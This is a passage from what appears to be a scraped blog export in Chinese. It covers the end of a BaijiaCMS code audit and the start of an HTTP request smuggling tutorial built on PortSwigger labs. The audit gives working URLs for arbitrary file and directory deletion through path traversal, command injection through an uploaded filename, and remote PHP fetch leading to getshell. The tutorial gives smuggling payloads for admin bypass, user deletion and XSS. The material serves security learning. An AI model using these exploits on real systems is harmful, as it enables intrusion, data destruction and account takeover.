base64_decode($_GP['id']);\n\n \t\t\t$path = WEB_ROOT . '/config/data_backup/';\n\t\tif(is_dir($path . $d)) &#123;\n\t\t\trmdirs($path . $d);\n\t\t\tmessage('备份删除成功！', create_url('site', array('act' => 'manager','do' => 'database','op'=>'restore')),'success');\n\t\t&#125;\n&#125;\n可以发现这里对变量进行了base64_decode处理，这下我们想删除的目录的话，我们首先需要对他进行一个base64编码，同时我们可以看到这里指定了路径\n$path = WEB_ROOT . '/config/data_backup/';\n但这个我们其实是可以绕过的，后续只校验了是不是目录，而未限定目录，所以我们通过burpsuite抓包修改目录就可以实现任意目录删除。\n接下来进行利用尝试首先我们在根目录下新建一个目录（名字随便，我这里为qwq）接下来访问这个数据库备份界面，具体路由如下\nhttp://127.0.0.1:8080/baijiacms-master/index.php?mod=site&amp;act=manager&amp;do=database&amp;op=restore&amp;beid=1\n开启bp抓包，点击删除功能点。发送到重放包界面，修改id为Li4vLi4vcXdx(../../qwq的Base64编码形式)此时再回根目录查看\n疑点二除了rmdir和unlink，我们常常还可以关注delete函数，因为他直译过来也是删除的意思，所以接下来就全局进行搜索delete()而后在includes\\baijiacms\\common.inc.php中发现相关代码，具体代码如下\nfunction file_delete($file_relative_path) &#123;\n\n\tif(empty($file_relative_path)) &#123;\n\t\treturn true;\n\t&#125;\n\t\n\t$settings=globaSystemSetting();\n\tif(!empty($settings['system_isnetattach']))\n\t\t&#123;\n\t\t\t\tif($settings['system_isnetattach']==1)\n\t\t&#123;\n\t\trequire_once(WEB_ROOT.'/includes/lib/lib_ftp.php');\n\t\t\t$ftp=new baijiacms_ftp();\n\t\tif (true === $ftp->connect()) &#123;\n\t\t\tif ($ftp->ftp_delete($settings['system_ftp_ftproot']. $file_relative_path)) &#123;\n\t\t\t\treturn true;\n\t\t\t&#125; else &#123;\n\t\t\t\treturn false;\n\t\t\t&#125;\n\t\t&#125; else &#123;\n\t\t\treturn false;\n\t\t&#125;\n\t&#125; \n\t\tif($settings['system_isnetattach']==1)\n\t\t&#123;\n\t\trequire_once(WEB_ROOT.'/includes/lib/lib_oss.php');\n\t\t$oss=new baijiacms_oss();\n\t\t$oss->deletefile($file_relative_path);\n\t\treturn true;\n\t&#125;\n&#125;else\n&#123;\n\t\tif (is_file(SYSTEM_WEBROOT . '/attachment/' . $file_relative_path)) &#123;\n\t\tunlink(SYSTEM_WEBROOT . '/attachment/' . $file_relative_path);\n\t\treturn true;\n\t&#125;\n\t\n\t&#125;\n\treturn true;\n&#125;\n这里重点关注这一个\nif(!empty($settings['system_isnetattach']))\n当这个执行通过时，就不会去删除，反之，直接将文件删除，因此我们有必要去找一下这个是什么东西，照旧，全局搜索这里发现是远程附件，因此我们这里选择本地的话，按理说就可直达else，对文件进行直接删除，访问具体路由\nhttp://127.0.0.1:8080/baijiacms-master/index.php?mod=site&amp;act=manager&amp;do=netattach&amp;beid=1\n接下来就设置好了，接下来去寻找运用了这个file_delete函数的文件，全局搜索一下文件路由为system\\eshop\\core\\mobile\\util\\uploader.php，部分代码如下\n&#125; elseif ($operation == 'remove') &#123;\n    $file = $_GPC['file'];\n    file_delete($file);\n    show_json(1);\n&#125;\n因此我们这里访问这个路由并设置operation 为remove，按理说就可以直接删文件了，接下来尝试利用。\n首先在根目录新建文件，这里命名为qwq.txt接下来访问路由\nhttp://127.0.0.1:8080/baijiacms-master/index.php?mod=mobile&amp;act=uploader&amp;do=util&amp;m=eshop&amp;op=remove&amp;file=../test.txt\n此时查看根目录文件已成功删除\n同时，我们刚刚还看到了不止这一个文件利用了delete函数，另外的是否存在呢，我们来看一下文件路由system\\eshop\\core\\web\\shop\\category.php，具体代码\nelseif ($operation == 'post') &#123;\n\t\t...\n\t\t...\n\t\t...\n\t\tif (!empty($id)) &#123;\n            unset($data['parentid']);\n            pdo_update('eshop_category', $data, array(\n                'id' => $id\n            ));\n            \n            file_delete($_GPC['thumb_old']);\n          \n这里可以发现想删除文件，需要有三个条件\n1、$operation == 'post'\n2、$id不为空\n3、$_GPC['thumb_old']为具体文件名\n所以我们按理说的话，我们去访问这个路由，然后修改$operation为post，添加参数$id=1，同时附加参数$thumb_old为想删除文件名即可实现删除文件，这个$operation在前面可以看到其实是参数op所以我们直接给op赋值为post，即可实现文件删除，接下来进行尝试\n在根目录新建文件qwq2.txt接下来访问路由\nhttp://127.0.0.1:8080/baijiacms-master/index.php?mod=site&amp;act=category&amp;op=post&amp;do=shop&amp;m=eshop&amp;beid=2&amp;id=1&amp;thumb_old=../qwq.txt\n此时即可实现删除文件\n命令执行针对命令执行，我们关注的函数肯定是eval、system、exec这几个，所以接下来就尝试去利用Vscode的全局搜索来寻找可疑点。首先搜索的是eval找到的大多数是带有eval的关键词而非eval函数，只有寥寥几个文件涉及了eval函数，接下来进行简单分析\n疑点一（失败）文件路由baijiacms-master\\system\\shopwap\\template\\mobile\\login_dingtalk_pc.php，部分代码如下\nfunction checkstatus()&#123;\n$.get(\"&lt;?php echo create_url('mobile',array('act' => 'dingtalk','do' => 'fastlogin_pc','op'=>'dologincheck','skey'=>$showkey));?>\", &#123;&#125;, function(data)&#123;\nvar data= eval(\"(\" + data + \")\");\n\n  if(data.status==1)\n  &#123;\n location.href=\"&lt;?php echo create_url('mobile',array('act' => 'dingtalk','do' => 'fastlogin_pc','op'=>'tologin','skey'=>$showkey));?>\";\n  &#125;\n  if(data.status==-1)\n  &#123;\n  alert(\"登录失败！重新刷新二维码登录\");\t\n  location.href=\"&lt;?php echo create_url('mobile',array('act' => 'shopwap','do' => 'login','op'=>'dingtalk'));?>\";\n  &#125;\n&#125;);\n&#125; \n这里的话可以看出是js类代码，简单分析一下这个函数，不难发现参数第一个是取对应的URL，第二个函数，也就是function(data),它是对从第一个URL中提取出的参数进行执行，这里我们接着看函数，它这里当执行过函数后，对结果的状态取值进行了判断，结果为1时判断为登录成功，就会跳转至另一个界面，而当为-1时就会登录失败，重回登录界面，所以我们这里可以看到他其实是不存在输出执行结果的地方的，所以我们根本无从下手，这里是无法实现命令执行的，所以Pass。\n类似的文件还有如下几个，亦不必再看\n文件路由：baijiacms-master\\system\\shopwap\\template\\mobile\\login_weixin_pc.php\n部分代码：\nfunction checkstatus()&#123;\n$.get(\"&lt;?php echo create_url('mobile',array('act' => 'weixin','do' => 'fastlogin_pc','op'=>'dologincheck','skey'=>$showkey));?>\", &#123;&#125;, function(data)&#123;\nvar data= eval(\"(\" + data + \")\");\n\n  if(data.status==1)\n  &#123;\n location.href=\"&lt;?php echo create_url('mobile',array('act' => 'weixin','do' => 'fastlogin_pc','op'=>'tologin','skey'=>$showkey));?>\";\n  &#125;\n  if(data.status==-1)\n  &#123;\n  alert(\"登录失败！重新刷新二维码登录\");\t\n  location.href=\"&lt;?php echo create_url('mobile',array('act' => 'shopwap','do' => 'login','op'=>'weixin'));?>\";\n  &#125;\n&#125;);\n&#125; \nsetInterval(\"checkstatus()\",2000);\n\n文件路由：baijiacms-master\\system\\weixin\\template\\mobile\\badding_weixin_pc.php\n部分代码：\nfunction checkstatus()&#123;\n$.get(\"&lt;?php echo create_url('mobile',array('act' => 'weixin','do' => 'banding_pc','op'=>'dologincheck','skey'=>$showkey));?>\", &#123;&#125;, function(data)&#123;\nvar data= eval(\"(\" + data + \")\");\n\n  if(data.status==1)\n  &#123;\n location.href=\"&lt;?php echo create_url('mobile',array('act' => 'shopwap','do' => 'account'));?>\";\n  &#125;\n  if(data.status==-1)\n  &#123;\n  alert(\"登录失败！重新刷新二维码登录\");\t\n  location.href=\"&lt;?php echo create_url('mobile',array('act' => 'weixin','do' => 'fastlogin','bizstate'=>'banding_weixin'));?>\";\n  &#125;\n&#125;);\n&#125; \nsetInterval(\"checkstatus()\",2000);\n疑点二接下来我们关注system函数，直接Vscode全局搜最终在includes\\baijiacms\\common.inc.php下找到system函数，其中部分代码如下\nfunction file_save($file_tmp_name,$filename,$extention,$file_full_path,$file_relative_path,$allownet=true)\n&#123;\n\t\n\t$settings=globaSystemSetting();\n\t\n\t\tif(!file_move($file_tmp_name, $file_full_path)) &#123;\n\t\t\treturn error(-1, '保存上传文件失败');\n\t\t&#125;\n\t\tif(!empty($settings['image_compress_openscale']))\n\t\t&#123;\n\t\t\t\n\t\t\t$scal=$settings['image_compress_scale'];\n\t\t\t$quality_command='';\n\t\t\tif(intval($scal)>0)\n\t\t\t&#123;\n\t\t\t\t$quality_command=' -quality '.intval($scal);\n\t\t\t&#125;\n\t\t\t\tsystem('convert'.$quality_command.' '.$file_full_path.' '.$file_full_path);\n\t\t&#125;\n\t\t...\n\t\t....\n\t\t.....\n这里可以看到是保存文件的，在其中进行了一个判断是否上传成功的，这个自不必在意，这里我们看另一个\nif(!empty($settings['image_compress_openscale']))\n这个是什么意思呢，我们这里可以看出如果这个判断可以通过，而后就会对文件名和文件路径进行一个system执行，那我们就有可能实现命令执行，因此我们的首要任务就是找到这个是什么东西，所以接下来全局搜索image_compress_openscale此时就找到了，它就是图片压缩功能，所以我们直接去开启这个功能，这里这个if判断就可以通过啦，所以接下来首先去开启这个，访问路由如下\nhttp://127.0.0.1:8080/baijiacms-master/index.php?mod=site&amp;act=manager&amp;do=netattach&amp;beid=1\n接下来我们跟进看一下哪个文件利用了这个函数，毕竟找到文件才能利用。可以发现这里的话对此函数进行了一个利用，具体代码如下\n$extention = pathinfo($file['name'], PATHINFO_EXTENSION);\n        $extention=strtolower($extention);\n    if($extention=='txt')\n    &#123;\n               $substr=substr($_SERVER['PHP_SELF'], 0, strrpos($_SERVER['PHP_SELF'], '/'));\n               if(empty( $substr))\n               &#123;\n                $substr=\"/\";    \n               &#125;\n           $verify_root= substr(WEB_ROOT.\"/\",0, strrpos(WEB_ROOT.\"/\", $substr)).\"/\";\n\n        //file_save($file['tmp_name'],$file['name'],$extention,$verify_root.$file['name'],$verify_root.$file['name'],false);\n                file_save($file['tmp_name'],$file['name'],$extention,WEB_ROOT.\"/\".$file['name'],WEB_ROOT.\"/\".$file['name'],false);\n\n                if($verify_root!=WEB_ROOT.\"/\")\n                &#123;\n                    copy(WEB_ROOT.\"/\".$file['name'],$verify_root.\"/\".$file['name']);\n                &#125;\n\n         $cfg['weixin_hasverify']=$file['name'];\n    &#125;\n这里的话是对上传文件进行了pathinfo函数处理，其实也就是获取了拓展名（后缀名），当为txt后缀时，会继续往下进行，继而调用这个file_save函数，所以我们这里的思路就明了了，我们这里新建一个文件，命名为xxx命令.txt，此时按理说就可以达到一个命令执行的效果，接下来进行尝试。\n我们这里新建一个txt文件，命名为&amp;ipconfig&amp;.txt接下来对其进行上传，具体路由\nhttp://127.0.0.1:8080/baijiacms-master/index.php?mod=site&amp;act=weixin&amp;do=setting&amp;beid=1\n接下来保存便可以看到效果\n任意文件读取疑点一（失败）文件路由/system/eshop/core/mobile/shop/util.php，重要代码如下\n&#125; else if ($operation == 'areas') &#123;\n\n        require_once WEB_ROOT . '/includes/lib/json/xml2json.php';\n        $file    = ESHOP_AREA_XMLFILE;\n        $content = file_get_contents($file);\n        $json    = xml2json::transformXmlStringToJson($content);\n        $areas   = json_decode($json, true);\n    die(json_encode($areas));\n其他暂且不看，我们这里先看这两个\n$file    = ESHOP_AREA_XMLFILE;\n$content = file_get_contents($file);\n本来直接包含$file的话，确实是可能存在文件读取，但我们这里可以看到它这里是给$file直接赋值了，这个是什么呢，我们全局搜索一下可以发现是一个xml文件那么它对我们来说是不可控的，所以这里就不存在文件读取了，因此这里属于误报，看下一处。\n所以类似这种的可疑点不必再关注，这里简单列出几个\n文件名：/system/eshop/core/web/sale/enough.php\n部分代码：\n$content = file_get_contents($file);\n\n文件名：/system/eshop/core/web/shop/dispatch.php\n部分代码：\n$content = file_get_contents($file);\n文件上传疑点一文件上传，这里Seay并未扫到什么，所以我们手动来进行寻找，对于文件上传，最先想到的就是上传二字，对应英文为upload，所以直接Vscode全局搜索upload()文件路由为includes\\baijiacms\\common.inc.php，具体代码如下\nfunction file_upload($file, $type = 'image') &#123;\n\tif(empty($file)) &#123;\n\t\treturn error(-1, '没有上传内容');\n\t&#125;\n\t$limit=5000;\n\t$extention = pathinfo($file['name'], PATHINFO_EXTENSION);\n\t$extention=strtolower($extention);\n\tif(empty($type)||$type=='image')\n\t&#123;\n\t$extentions=array('gif', 'jpg', 'jpeg', 'png');\n\t&#125;\n\tif($type=='music')\n\t&#123;\n\t$extentions=array('mp3','wma','wav','amr','mp4');\n\t&#125;\n\t\tif($type=='other')\n\t&#123;\n\t$extentions=array('gif', 'jpg', 'jpeg', 'png','mp3','wma','wav','amr','mp4','doc');\n\t&#125;\n\t...\n\t...\n&#125;\n这里可以看到这个是进行了很多检测的，对文件类型进行了检测，且要求了后缀，所以这个函数应该是文件上传不了了，但还好它不止一个有关upload的函数，我们往下看到这样一个函数\nfunction fetch_net_file_upload($url) &#123;\n\t$url = trim($url);\n\t\n\n\t$extention = pathinfo($url,PATHINFO_EXTENSION );\n\t$path = '/attachment/';\n\t$extpath=\"&#123;$extention&#125;/\" . date('Y/m/');\n\n\t\tmkdirs(WEB_ROOT . $path . $extpath);\n\t\tdo &#123;\n\t\t\t$filename = random(15) . \".&#123;$extention&#125;\";\n\t\t&#125; while(is_file(SYSTEM_WEBROOT . $path . $extpath. $filename));\n\t\n\t\n\t\n\t$file_tmp_name = SYSTEM_WEBROOT . $path . $extpath. $filename;\n\t\t$file_relative_path = $extpath. $filename;\n\tif (file_put_contents($file_tmp_name, file_get_contents($url)) == false) &#123;\n\t\t$result['message'] = '提取失败.';\n\t\treturn $result;\n\t&#125;\n\t\t$file_full_path = WEB_ROOT .$path . $extpath. $filename;\n\treturn file_save($file_tmp_name,$filename,$extention,$file_full_path,$file_relative_path);\n&#125;\n可以发现这个只对文件进行了pathinfo函数处理，取出其后缀名，然后拼接路径及随机数字来组成文件名，那么我们如果通过这个函数进行文件上传，按理说就可以上传php文件实现getshell，接下来看看哪个文件利用了此函数文件路由system\\public\\class\\web\\file.php，具体代码\nif ($do == 'fetch') &#123;\n\t$url = trim($_GPC['url']);\n$file=fetch_net_file_upload($url);\n\tif (is_error($file)) &#123;\n\t\t$result['message'] = $file['message'];\n\t\tdie(json_encode($result));\n\t&#125;\n\t\n&#125;\n接下来我们只需要满足do=fetch，然后url中包含我们的文件，便可实现文件上传，我这里远程文件内容如下接下来进行利用尝试。访问路由如下\nhttp://127.0.0.1:8080/baijiacms-master/index.php?mod=web&amp;do=file&amp;m=public&amp;op=fetch&amp;url=http://xxx.xxx.xxx.xxx/qwq.php\n访问给出的文件路径可以发现此时已经实现了文件上传，如果传一句话木马即可Getshell。\n后言本次CMS审计是小白的第一次大幅度利用手动搜索危险函数来寻找漏洞，共计耗时半周，对本小白来说已颇为吃力，其中颇多审计失败的点，虽审计失败，但仍感觉对代码能力有了进一步了解，也算有所收获。最后，如果文章中有错误，还望各位大师傅多多指正。\n参考文献https://xz.aliyun.com/t/10678#toc-5https://xz.aliyun.com/t/9955#toc-0http://moy1sec.com/2021/11/24/baijiacms\n","slug":"代码审计之旅之百家CMS","date":"2022-11-02T17:41:30.000Z","categories_index":"代码审计","tags_index":"代码审计","author_index":"quan9i"},{"id":"b78771140557d7dad4bcf7d70597ef1a","title":"初探HTTP请求走私","content":"声明文章首发于跳跳糖社区https://tttang.com/archive/1808/\n前言ISCC2022[让我康康]这道赛题在接触时令我记忆犹新，之前由于学习知识其他也一直没有对HTTP请求走私进行相关学习，最近学习过后简单总结如下，希望能对正在学习HTTP请求走私的师傅有所帮助。\n前置知识\n\n\n\n\n\n\n\n\nContent-Length\nContent-Length指的是HTTP消息长度, 它使用十进制的数字表示了消息的长度, 服务器通过它来得知后续要读取消息的长度。Content-Length首部指出报文中实体主体的字节大小. 这个大小是包含了所有内容编码的，比如，对文本文件进行了gzip压缩，那它的大小就是压缩后的大小而非之前的。\n\n\n\n\n\n\n\n\n\nKeep-alive\n这个的话就是在HTTP请求中增加一个特殊的请求头Connection: Keep-Alive，其作用是告诉服务器接受完信息后，不要关闭TCP连接，后续对相同目标服务器的请求，一律采用这个TCP连接。\n\n\n\n\n\n\n\n\n\npipline\n其含义是新建一个TCP链接，有这个之后，客户端无需等待服务端的响应，就可以发送多次请求，单说可能不太好理解，可以结合下面这个图来进行理解\n\n\n\n\n\n\n\n\n\nTransfer-Encoding\n它的含义是传输编码。在最新的 HTTP 规范里，只定义了一种传输编码：分块编码（chunked）。当使用分块编码的时候，报文中的实体需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的 CRLF（\\r\\n），也不包括分块数据结尾的 CRLF。最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。\nHTTP请求走私下方示例的靶场均来自于portswig靶场，链接如下https://portswigger.net/web-security/all-labs\n漏洞成因一些网站为了优化用户体验，提高访问速度，采用了CDN加速服务，而最简单的加速方式是在原站点加上一个具有缓存功能的反向代理服务器，这个时候用户可以直接从代理服务器处取得资源，图示如下(图片来源于https://paper.seebug.org/1048)这个时候如果客户端传入一个恶意的请求数据，前端服务器（代理服务器）可能认为没问题，就传给了后端，而后端服务器（原站）在理解时，只认为一部分是正常请求，而另一部分请求就是走私的请求，他会对第二个请求造成影响，此时也就造成了HTTP走私攻击。\n漏洞危害HTTP请求走私的危害有以下几个方面\n1、它使攻击者可以绕过安全控制访问到本该被禁止访问的界面，可能会导致信息泄露\n2、在特定情况下可以构造XSS语句，对其他用户和网页端造成一定影响\n3、它可以实现未经授权访问敏感数据并直接危害其他应用程序用户。\n4、在特定情况下可以窃取用户请求，获取到用户的cookie等敏感信息\n\n漏洞利用CL!=0现有条件如下\n\n\n\n\n\n\n\n\n\n代理服务器允许GET请求携带请求体，而原站不允许GET请求携带请求体\n此时如果我们传入携带请求体的GET请求，就会出现一种情况，就是此时它会直接忽略掉GET请求中的Content-Length头，不进行处理。这就有可能导致请求走私。\n我们构造请求如下\nGET / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\nContent-Length: 44\\r\\n\n\nGET /secret HTTP/1.1\\r\\n\nHost: example.com\\r\\n\n\\r\\n\n此时代理服务器收到请求，认为这个是正常的，传给后端服务器，而后端服务器不对这个Content-Length进行处理，此时因为存在pipline，他就会认为是两个单独的请求。第一个\nGET / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\n第二个\nGET /secret HTTP/1.1\\r\\n\nHost: example.com\\r\\n\n此时就出现了请求走私。\nCL-CL按照RFC7230中的规定，当服务器遇见一个请求中包含两个Content-Length时，应该返回400错误，但一些服务器可能不会严格执行该规范，此时就可能出现请求走私。\n假设现有场景如下\n\n\n\n\n\n\n\n\n\n前端代理服务器和后端服务器在收到一个包含两个Content-Length的请求时，皆不返回400，且此时前端代理服务器采用的是第一个Content-Length，后端服务器采用的是第二个Content-Length\n此时我们构造请求如下\nPOST / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\nContent-Length: 8\\r\\n\nContent-Length: 7\\r\\n\n\n12345\\r\\n\na\n前端代理服务器：接收的是Content-Length: 8\\r\\n，他检查的时候，看的是六七行（第五行是POST传数据需要空一行，不计算其长度），12345+\\n+a=8，此时正好八个字符，所以他认为这个请求没有问题，传向后端服务器。\n后端服务器：接收的是Content-Length: 7\\r\\n，他检查的时候，看的同样也是五六七行，此时因为出现了8个字符，而他只接收7个，所以a还停留在缓冲区，后端服务器会认为他是下一个请求的一部分。\n若此时有一个请求\nGET /index.html HTTP/1.1\\r\\n\nHost: example.com\\r\\n\n基于前端服务器和后端服务器是重用TCP连接的，此时a就会和请求相结合，组成一个新的请求\naGET /index.html HTTP/1.1\\r\\n\nHost: example.com\\r\\n\n此时客户就会收到aGET request method not found的错误回显，这就实现了一次请求走私攻击，并对正常客户造成了影响。\nCL-TE所指情况如下\n\n\n\n\n\n\n\n\n\n前端采用的是Content-Length后端采用的是Transfer-Encoding\n现有请求如下\nPOST / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\nConnection: keep-alive\\r\\n\nContent-Length: 6\\r\\n\nTransfer-Encoding: chunked\\r\\n\n\\r\\n\n0\\r\\n\n\\r\\n\na\n前端服务器:接收的是Content-Length: 6\\r\\n，看代码的7-9行，0+\\n+\\n+a=6，此时前端认为没有问题，就会传向后端服务器(第六行是POST传数据需要空出一行，所以不计算其长度)\n后端服务器:接收的是Transfer-Encoding: chunked\\r\\n，他在处理第七行（结束标志）时，值是0，他会认为是接收内容结束，此时其后的a还停留在缓冲区。\n若此时有一请求\nPOST / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\n\n与CL-CL相似，此时a会与这一请求相结合变成一个新的请求\naPOST / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\n此时客户端就会收到Unrecognized method aPOST的错误回显信息，这个时候就造成了请求走私攻击。\n靶场演示靶场链接https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te打开环境后抓包接下来右键修改请求方法为POST然后添加我们添加恶意代码\nContent-Length: 6\\r\\n\nTransfer-Encoding: chunked\\r\\n\n\\r\\n\n0\\r\\n\n\\r\\n\nG\n此时第一次发包，回显正常，这是因为它是正常CL阶段，读取6个字符，0+\\n+\\n+a=6,所以回显正常，接下来再发一次包此时由于TE读取到0就终止了，未读取G，G还在缓冲区，又来了一个请求，G就与这个请求相组合，变成了GPOST请求方式，此时就会报错，HTTP请求走私成功。\nTE-CL所指情况如下\n\n\n\n\n\n\n\n\n\n前端代理服务器采用的是Transfer-Encoding后端服务器采用的是Content-Length\n现有请求如下\nPOST / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\nContent-Length: 4\\r\\n\nTransfer-Encoding: chunked\\r\\n\n\\r\\n\n12\\r\\n\naPOST / HTTP/1.1\\r\\n\n\\r\\n\n0\\r\\n\n\\r\\n\n前端服务器:接收的是Transfer-Encoding: chunked\\r\\n，当读取到第九行（第五块）时，读取到0前端服务器认为接收内容结束，没有什么问题，然后传给后端服务器\n后端服务器:接收的是Content-Length: 4\\r\\n，此时因为接收长度限定为4，12+\\n=4，所以它在读取完五六行后就不再读取。\n此时后面还有一些代码，即\naPOST / HTTP/1.1\\r\\n\n\\r\\n\n0\\r\\n\n\\r\\n\n此时再来一个请求，他就会报错，客户端收到Unrecognized method aPOST类似的错误回显信息，请求走私攻击成功。\n靶场演示靶场地址如下https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl\n开启环境后抓包，抓包后修改请求方式接下来添加我们的恶意代码\nContent-Length: 4\nTransfer-Encoding: chunked\n\\r\\n\n12\\r\\n\nGPOST / HTTP/1.1\n\\r\\n\n0\\r\\n\n\\r\\n\n第一次发包后回显正常，这个是因为TE在读取到0后休止，认为之前的数据也没什么问题，此时就会传入给后端服务器，后端服务器接收4个长度，这里的话也就是12+\\n=4,后面的因为存在pipline，所以会被认为是另一个独立的请求此时再来一个新的请求，就会报错，请求走私攻击成功\nTE-TE所指情况如下\n\n\n\n\n\n\n\n\n\n前端代理服务器和后端服务器所采用的都是Transfer-Encoding，但是在容错性上表现不同，例如当我们添加一个Transfer-encoding时，引起混淆，此时可能其中一个服务器会不采用Transfer-Encoding,此时就会导致请求走私\n现有请求如下\nPOST / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\nContent-length: 4\\r\\n\nTransfer-Encoding: chunked\\r\\n\nTransfer-encoding: cow\\r\\n\n\\r\\n\n5c\\r\\n\naPOST / HTTP/1.1\\r\\n\nContent-Type: application/x-www-form-urlencoded\\r\\n\nContent-Length: 15\\r\\n\n\\r\\n\nx=1\\r\\n\n0\\r\\n\n\\r\\n\n前端代理服务器:接收的是Transfer-Encoding: chunked\\r\\n,此时读取到最后0处，认为请求没有问题，将请求传输个后端服务器\n后端服务器：此时因为存在Transfer-encoding和Transfer-Encoding，对服务器起到了混淆作用，服务器不知道该接收哪个，此时可能会接收Content-length: 4\\r\\n，然后检测第七行，5c+\\n=4,认为结果没问题，然后不再读取(第六行不算长度，因为第六行是POST传数据需要空一行)\n此时还剩下几行代码\naPOST / HTTP/1.1\\r\\n\nContent-Type: application/x-www-form-urlencoded\\r\\n\nContent-Length: 15\\r\\n\n\\r\\n\nx=1\\r\\n\n0\\r\\n\n\\r\\n\n因为存在pipline，所以被认为是一个单独的请求，此时就会给客户端回显Unrecognized method aPOST错误信息，请求走私攻击成功。\n靶场演示靶场地址如下https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header题目描述\n\n\n\n\n\n\n\n\n\n本实验涉及前端和后端服务器，这两个服务器以不同的方式处理重复的 HTTP 请求标头。前端服务器拒绝不使用 GET 或 POST 方法的请求。\n题目要求\n\n\n\n\n\n\n\n\n\n解决实验室，偷偷向后端服务器发送一个请求，让后端服务器处理的下一个请求出现使用方法GPOST。\n进入靶场后抓包，修改请求方法为POST方式发送到重放模块，接下来添加我们的恶意代码\nContent-length: 4\\r\\n\nTransfer-Encoding: chunked\\r\\n\nTransfer-encoding: cow\\r\\n\n\\r\\n\n5c\\r\\n\nGPOST / HTTP/1.1\\r\\n\n\\r\\n\nx=1\\r\\n\n0\\r\\n\n\\r\\n\n\n此时第一个访问正常，这个时候说明前端代理服务器采用的是TE，正常接收数据而后传送给后端服务器，而后端因为TE被混淆，且有CL，所以采用了CL，而此时57+\\n=4，所以后面的GPOST未进行读取，这个时候后面就会被当做单独请求来执行，当再一次请求时，就会将错误返回出来，成功执行HTTP请求走私。\n常见攻击面绕过前端安全控制这里用一道靶场题目来对其进行简单讲解。\n题目描述\n\n\n\n\n\n\n\n\n\n本实验涉及前端和后端服务器，前端服务器不支持分块编码。有一个管理面板/admin，但前端服务器阻止访问它。\n题目要求\n\n\n\n\n\n\n\n\n\n要解决实验室问题，请向访问管理面板并删除用户的后端服务器发送请求carlos。\n进入靶场后,尝试直接访问他的admin界面发现此时存在防护，是不允许访问此界面的。此时我们抓包，修改请求方式，接下来添加我们的恶意数据,尝试利用请求走私去访问admin界面\nContent-Length: 30\\r\\n\nTransfer-Encoding: chunked\\r\\n\n\\r\\n  \n0\\r\\n\n\\r\\n\nGET /admin HTTP 1.1\\r\\n\n\\r\\n\n\\r\\n\n这里简单提一下他的CT长度计算\nContent-Length: 30\\r\\n\nTransfer-Encoding: chunked\\r\\n\n\\r\\n   //POST发包需要有一行换行，这个不作为长度计算\n0\\r\\n //0加上换行符\\n，长度为3\n\\r\\n  //只有一个换行符，长度为2\nGET /admin HTTP 1.1\\r\\n //前面字符为19，后面还有换行符，所以一共长度为19+2=21\n\\r\\n //只有一个换行符，长度为2\n\\r\\n //只有一个换行符，长度为2\n//所以CT长度就是3+2+21+2+2=30\n此时还有一点，就是初始的Connection，是close，我们这里需要修改为keep-alive，这样才可以实现重用TCP链接，使得请求走私攻击成功此时我们发现新的回显\nAdmin interface only available to local users\n大概意思就是只有本地用户才可以登录，那我们就添加一个Host: 127.0.0.1来伪装一下本地用户此时发现删除用户的接口，那我们就尝试来构造一下\nConnection: keep-alive\nContent-Length: 70\\r\\n\nTransfer-Encoding: chunked\\r\\n\n\\r\\n\n0\\r\\n\n\\r\\n\nGET /admin/delete?username=carlos HTTP/1.1\\r\\n\nHost: localhost\\r\\n\n\\r\\n\n\\r\\n\n请求走私攻击成功，成功删除了一个用户\n请求走私引发反射型XSS单个的UA处的xss并没有什么危害，但当我们将它与请求走私相结合时，就可以导致其他用户访问任意界面出现反射型xss，对客户端和网页有一定影响，接下来尝试一下\n所用靶场https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss题目描述\n\n\n\n\n\n\n\n\n\n这个场景包含前端和后端服务器，并且前端服务器不支持Chunked-Encoding。应用程序在User-Agent这个标头含有反射型XSS漏洞。\n题目要求\n\n\n\n\n\n\n\n\n\n目标是让用户收到一个alert(1)的弹框。\n进入靶场后抓包，看一下UA处，先发包，观察一下他的包裹方式，既然题目提示这里存在XSS，那么我们就先观察一下他是如何闭合的可以发现结尾是&quot;&gt;，若存在XSS，我们通过构造恶意语句应该是可以触发XSS的，我们先尝试一下修改User-Agent，看是否能够触发xss成功触发XSS，因为前端不支持chunked编码方式，那么我们这里就可以尝试一下去构造CL-TE种类的请求走私，构造XSS，恶意代码如下\nContent-Length: 154\\r\\n\nTransfer-Encoding: chunked\\r\\n\n\\r\\n\n0\\r\\n\n\\r\\n\nGET /post?postId=5 HTTP/1.1\\r\\n\nUser-Agent: a\"/>&lt;script>alert(1)&lt;/script>\\r\\n\nContent-Type: application/x-www-form-urlencoded\\r\\n\nContent-Length: 5\\r\\n\n\\r\\n\nx=1\\r\\n\n\\r\\n\n第一次访问正常，接下来用户去访问界面成功触发了XSS，这个过程是如何实现的呢前端代理服务器：接收的是CL，然后检测内容没有什么问题，传输给后端服务器\n后端服务器：接收的是TE，接收到0后停止接收，而下面的还没被接收，被认为是另一个独立的请求，当此时有一个用户去访问界面时，这个请求就会发出，触发XSS\n请求走私实现Web缓存投毒学习之前我们首先需要了解一下什么是Web缓存\nWEB缓存就是指网站的静态文件，比如图片、CSS、JS等，在网站访问的时候，服务器会将这些文件缓存起来，以便下次访问时直接从缓存中读取，不需要再次请求服务器。\n如上图所示，假设小紫小黄小绿都在服务器划分的同一批特定请求中，那么小紫一开始访问服务器时，经过缓存键X-Cache: Miss的判定，是首次访问，所以直接连接到Server服务器，而其后的小黄、小绿再次访问相同的文件时就会被判定为X-Cache: 